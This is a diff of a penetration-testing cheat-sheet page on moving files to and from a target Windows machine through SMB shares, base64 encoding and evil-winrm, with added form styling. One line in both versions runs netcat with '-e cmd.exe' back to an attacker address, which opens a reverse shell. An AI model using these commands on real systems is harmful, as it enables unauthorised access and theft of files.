@@ -193,8 +193,131 @@
   <li><a href="https://tldrbins.github.io/@evil-winrm/">Evil-Winrm</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">SMB</button>
 
@@ -204,42 +327,43 @@
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="start-a-local-smb-server">Start a Local SMB Server</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-smbserver share . -smb2support
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-smbserver share . -smb2support
+</span></span></span></code></pre></div></div>
 <h4 id="cmd">cmd</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Connect to SMB server without creds</span>
-</span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">\</span><span class="n">share</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Connect to SMB server with creds</span>
-</span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">\</span><span class="n">share</span> <span class="p">/</span><span class="n">u:</span><span class="p">&lt;</span><span class="n">USER</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># From target Windows to local Linux</span>
-</span></span><span class="line"><span class="cl"><span class="nb">copy </span><span class="n">example</span><span class="p">.</span><span class="py">txt</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">\</span><span class="n">share</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># From local Linux to target Windows</span>
-</span></span><span class="line"><span class="cl"><span class="nb">copy </span><span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">example</span><span class="p">.</span><span class="py">txt</span> <span class="n">example</span><span class="p">.</span><span class="py">txt</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Delete file</span>
-</span></span><span class="line"><span class="cl"><span class="nb">del </span><span class="n">example</span><span class="p">.</span><span class="py">txt</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Remove SMB share</span>
-</span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="p">/</span><span class="n">d</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">\</span><span class="n">share</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Older Windows (e.g. xp), use directly</span>
-</span></span><span class="line"><span class="cl"><span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">10</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="py">exe</span> <span class="n">-e</span> <span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="py">10</span> <span class="mf">443</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Connect to SMB server without creds
+</span></span><span class="line"><span class="cl"><span class="go">net use \\&lt;LOCAL_IP&gt;\share
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Connect to SMB server with creds
+</span></span><span class="line"><span class="cl"><span class="go">net use \\&lt;LOCAL_IP&gt;\share /u:&lt;USER&gt; &#39;&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> From target Windows to <span class="nb">local</span> Linux
+</span></span><span class="line"><span class="cl"><span class="go">copy &lt;FILE&gt; \\&lt;LOCAL_IP&gt;\share
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> From <span class="nb">local</span> Linux to target Windows
+</span></span><span class="line"><span class="cl"><span class="go">copy \\&lt;LOCAL_IP&gt;\share\&lt;FILE&gt; &lt;FILE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Delete file
+</span></span><span class="line"><span class="cl"><span class="go">del &lt;FILE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remove SMB share
+</span></span><span class="line"><span class="cl"><span class="go">net use /d \\&lt;LOCAL_IP&gt;\share
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Older Windows <span class="o">(</span>e.g. xp<span class="o">)</span>, use directly
+</span></span><span class="line"><span class="cl"><span class="go">\\&lt;LOCAL_IP&gt;\share\nc.exe -e cmd.exe &lt;LOCAL_IP&gt; &lt;LOCAL_PORT&gt;
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="small-binary">Small binary</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># In target Windows</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">System.convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="s1">&#39;C:\ProgramData\example.exe&#39;</span> <span class="n">-Encoding</span> <span class="n">Byte</span><span class="p">))</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy and paste the base64 encoded binary to local Linux</span>
-</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -n <span class="s1">&#39;&lt;BASE64_BINARY&gt;&#39;</span> <span class="p">|</span> base64 -d &gt; example.exe
-</span></span></code></pre></div><p><small><em>Note: For restricted environment</em></small></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In target Windows
+</span></span><span class="line"><span class="cl"><span class="go">[System.convert]::ToBase64String((Get-Content -Path &#39;C:\ProgramData\&lt;FILE&gt;&#39; -Encoding Byte))
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste the base64 encoded binary to <span class="nb">local</span> Linux
+</span></span><span class="line"><span class="cl"><span class="go">echo -n &#39;&lt;BASE64_BINARY&gt;&#39; | base64 -d &gt; &lt;FILE&gt;
+</span></span></span></code></pre></div><p><small><em>Note: For restricted environment</em></small></p>
 </div></div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Evil-winrm built-in function</span>
-</span></span><span class="line"><span class="cl">download <span class="s2">&#34;C:\ProgramData\example.txt&#34;</span> <span class="s2">&#34;/tmp/example.txt&#34;</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Evil-winrm built-in <span class="k">function</span>
+</span></span><span class="line"><span class="cl"><span class="go">download &#39;C:\ProgramData\&lt;FILE&gt;&#39; &#39;&lt;LOCAL_DEST_PATH&gt;&#39;
+</span></span></span></code></pre></div></div>
 </div></p>
-<br></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
